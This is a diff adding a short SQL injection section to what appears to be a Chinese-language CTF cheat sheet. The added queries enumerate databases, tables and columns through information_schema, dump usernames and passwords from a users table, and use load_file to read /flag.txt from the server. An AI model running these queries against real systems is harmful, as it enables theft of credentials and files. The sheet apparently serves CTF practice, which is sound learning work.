@@ -1660,3 +1660,39 @@ print(result)
 /proc/net/fib_trie
 ```
 
+
+
+## sql注入
+
+**查询数据库:**
+
+```
+select group_concat(schema_name) from information_schema.schemata
+```
+
+**查询表名:**
+
+```
+select GROUP_CONCAT(TABLE_NAME) from information_schema.tables where table_schema=database()
+```
+
+**查询列名:**
+
+```
+select GROUP_CONCAT(COLUMN_name) from information_schema.columns where table_schema=database() and TABLE_NAME='users'
+```
+
+**查询账号密码:**
+
+```
+select GROUP_CONCAT(username,'~',password) from users;
+```
+
+
+
+### load_file读取
+
+```
+select load_file('/flag.txt')
+```
+
